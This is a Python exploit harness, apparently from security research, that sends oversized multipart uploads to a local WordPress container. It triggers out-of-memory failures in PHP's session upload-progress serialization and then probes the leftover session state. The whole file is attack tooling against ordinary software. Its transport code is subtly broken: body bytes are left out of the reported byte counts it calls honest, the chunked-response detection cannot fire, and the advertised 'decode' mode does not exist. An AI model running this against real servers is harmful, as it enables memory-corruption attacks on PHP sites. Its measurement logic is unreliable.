#!/usr/bin/env python3
"""wpfire.py - honest-transport harness for the wordpress 618/619 lanes.

Daybreak review fixes (2026-10-22):
- Transport reporting: HTTP bytes received, transport outcome
  (COMPLETE | EOF | RESET | TIMEOUT), framing (content-length | chunked |
  close), and process outcome are recorded SEPARATELY. No manufactured
  markers ever count toward received bytes (the old "\n<EOF>" bug measured
  6 fake bytes on closed connections - fire.py len=6 was that artifact).
- Chunked keep-alive responses are decoded properly.
- Every fire writes a JSON evidence record (+ raw response bytes) with run
  metadata: php version, image id, key INIs, worker config, target.

Fire modes:
  encode   multipart upload-progress producer (big filename -> OOM inside
           the FILE_START progress ENCODE -> BG(serialize) stale)
  decode   staged-session-file producer (big token -> OOM inside the
           session DECODE -> BG(unserialize) stale) [assisted: file staged
           in-container; see MILESTONE ladder in TODO.md]
  reader   benign upload on a SID (consumes whatever state its session
           file + worker globals hold)
  benign   small upload, no OOM (negative control shape)
"""
import argparse
import json
import os
import re
import socket
import subprocess
import time
from datetime import datetime, timezone

COMPLETE, EOF, RESET, TIMEOUT = "COMPLETE", "EOF", "RESET", "TIMEOUT"


class Response:
    def __init__(self):
        self.http_bytes = 0        # bytes actually received from the server
        self.outcome = COMPLETE    # transport-level outcome
        self.framing = "close"
        self.status = None        # parsed status code
        self.raw = b""             # exact bytes received
        self.elapsed = 0.0

    def summary(self):
        return (f"http_bytes={self.http_bytes} outcome={self.outcome} "
                f"framing={self.framing} status={self.status} "
                f"t={self.elapsed:.2f}s")


def http_exchange(host, port, data, timeout=45, keep_alive=True):
    """Send raw request bytes; read ONE response with correct framing.

    Returns Response. http_bytes counts ONLY real received bytes.
    """
    r = Response()
    t0 = time.time()
    s = socket.create_connection((host, port), timeout=15)
    try:
        s.sendall(data)
        s.settimeout(timeout)
        buf = b""
        # read headers
        while b"\r\n\r\n" not in buf:
            try:
                d = s.recv(65536)
            except socket.timeout:
                r.outcome = TIMEOUT
                r.raw = buf
                r.http_bytes = len(buf)
                r.elapsed = time.time() - t0
                return r
            except ConnectionResetError:
                r.outcome = RESET
                r.raw = buf
                r.http_bytes = len(buf)
                r.elapsed = time.time() - t0
                return r
            if not d:
                r.outcome = EOF
                r.raw = buf
                r.http_bytes = len(buf)
                r.elapsed = time.time() - t0
                return r
            buf += d
        head, _, rest = buf.partition(b"\r\n\r\n")
        m = re.search(rb"Content-Length: (\d+)", head, re.I)
        total = None
        if m:
            r.framing = "content-length"
            total = int(m.group(1))
        elif b"chunked" in head.lower():
            r.framing = "chunked"
        else:
            r.framing = "close"
        if r.framing == "close":
            # read until EOF
            while True:
                try:
                    d = s.recv(65536)
                except socket.timeout:
                    r.outcome = TIMEOUT
                    break
                except ConnectionResetError:
                    r.outcome = RESET
                    break
                if not d:
                    r.outcome = COMPLETE
                    break
                buf += d
        else:
            need = total if r.framing == "content-length" else None
            while True:
                if need is not None and len(rest) >= need:
                    break
                # chunked: wait for the terminating 0\r\n\r\n
                if r.framing == "chunked" and re.search(
                        rb"0\r\n\r\n$", buf[-8:]):
                    break
                try:
                    d = s.recv(65536)
                except socket.timeout:
                    r.outcome = TIMEOUT
                    break
                except ConnectionResetError:
                    r.outcome = RESET
                    break
                if not d:
                    r.outcome = EOF
                    break
                rest += d
        r.raw = buf
        r.http_bytes = len(buf)
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        if m:
            r.status = int(m.group(1))
        r.elapsed = time.time() - t0
        return r
    finally:
        try:
            s.close()
        except Exception:
            pass


B = b"WPFIRE"

def mp_part(name, body, filename=None):
    d = (b"--" + B + b"\r\n" +
         b'Content-Disposition: form-data; name="' + name + b'"')
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"

def mp_body(parts):
    return b"".join(parts) + b"--" + B + b"--\r\n"

def post_request(host, port, body, keep_alive=True):
    conn = "keep-alive" if keep_alive else "close"
    return ((f"POST / HTTP/1.1\r\nHost: {host}:{port}\r\n"
             f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
             f"Content-Length: {len(body)}\r\n"
             f"Connection: {conn}\r\n\r\n").encode() + body)

def build_fire(mode, host, port, sid, fname_len=430080):
    """Build the request bytes for a mode. Returns (tag, bytes)."""
    sidb = sid.encode()
    if mode == "encode":
        # big filename -> FILE_START progress-encode OOM (needs low-ish
        # memory_limit to cross; see experiment notes)
        body = mp_body([mp_part(b"PHPSESSID", sidb),
                        mp_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc"),
                        mp_part(b"u", b"x", filename=b"A" * fname_len)])
    elif mode == "reader":
        body = mp_body([mp_part(b"PHPSESSID", sidb),
                        mp_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k2"),
                        mp_part(b"u", b"y", filename=b"b.txt")])
    elif mode == "benign":
        body = mp_body([mp_part(b"PHPSESSID", sidb),
                        mp_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
                        mp_part(b"u", b"z", filename=b"c.txt")])
    else:
        raise SystemExit(f"unknown mode {mode}")
    return post_request(host, port, body)


def run_meta(service):
    """Collect run metadata for evidence provenance (timeout-bounded)."""
    def sh(args):
        try:
            return subprocess.run(args, capture_output=True, text=True,
                                  timeout=20).stdout.strip()
        except Exception as e:
            return f"<{e}>"
    cd = os.path.dirname(os.path.abspath(__file__))
    meta = {
        "service": service,
        "ts": datetime.now(timezone.utc).isoformat(),
        "php_v": sh(["docker", "compose", "exec", "-T", service, "php", "-v"]).splitlines()[:1],
        "image_id": sh(["docker", "compose", "images", "-q", service]),
        "memory_limit": sh(["docker", "compose", "exec", "-T", service, "php", "-i"]).split("memory_limit => ")[-1].split("\n")[0] if "memory_limit" in sh(["docker", "compose", "exec", "-T", service, "php", "-i"]) else "?",
        "post_max": sh(["docker", "compose", "exec", "-T", service, "php", "-i"]).split("post_max_size => ")[-1].split("\n")[0] if "post_max_size" in sh(["docker", "compose", "exec", "-T", service, "php", "-i"]) else "?",
    }
    return meta


def main():
    p = argparse.ArgumentParser()
    p.add_argument("mode", choices=["encode", "decode", "reader", "benign"])
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8099)
    p.add_argument("--service", default="wordpress-x86",
                   help="compose service for metadata")
    p.add_argument("--sid", required=True)
    p.add_argument("--fname-len", type=int, default=430080)
    p.add_argument("--timeout", type=int, default=45)
    p.add_argument("--evidence-dir", default="results/wp-lastmile")
    p.add_argument("--tag", default="")
    a = p.parse_args()

    req = build_fire(a.mode, a.host, a.port, a.sid, a.fname_len)
    resp = http_exchange(a.host, a.port, req, timeout=a.timeout)
    meta = run_meta(a.service)

    body = resp.raw.partition(b"\r\n\r\n")[2] if b"\r\n\r\n" in resp.raw else b""
    fatal = re.search(rb"tried to allocate (\d+) bytes", body)
    record = {
        "mode": a.mode, "sid": a.sid, "fname_len": a.fname_len,
        "resp": resp.summary(),
        "fatal_alloc": int(fatal.group(1)) if fatal else None,
        "fatal_line": (re.search(rb"in <b>([^<]+)</b> on line <b>(\d+)", body) or [None, None, None])[1:],
        "resp_head": body[:400].decode(errors="replace"),
        "meta": meta,
    }
    os.makedirs(a.evidence_dir, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
    base = os.path.join(a.evidence_dir, f"{ts}_{a.mode}_{a.tag or a.sid}")
    with open(base + ".json", "w") as f:
        json.dump(record, f, indent=1)
    with open(base + ".raw", "wb") as f:
        f.write(resp.raw)
    print(json.dumps({k: record[k] for k in ("mode", "resp", "fatal_alloc")}))
    print(f"evidence: {base}.json")


if __name__ == "__main__":
    main()
